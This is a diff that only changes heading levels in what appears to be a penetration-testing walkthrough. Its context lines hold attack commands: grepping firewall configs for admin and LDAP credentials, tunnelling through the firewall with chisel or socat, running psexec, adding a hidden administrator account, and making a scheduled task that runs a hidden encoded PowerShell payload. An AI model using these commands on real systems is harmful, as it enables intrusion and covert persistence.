@@ -306,13 +306,13 @@ ip route
 cat /etc/resolv.conf
 ```
 
-# Look for management configs or logs
+#### Look for management configs or logs
 
 ```bash
 cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 ```
 
-# Attempt to pivot through firewall if routing/NAT is enabled
+#### Attempt to pivot through firewall if routing/NAT is enabled
 - sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
 network.
 
@@ -365,7 +365,7 @@ psexec.py orange.local/adminuser@172.20.0.X
 net user stealthyUser P@ssw0rd! /add
 net localgroup administrators stealthyUser /add
 ```
-## Persist via Scheduled Task or Service:
+### Persist via Scheduled Task or Service:
 
 ```bash
 schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
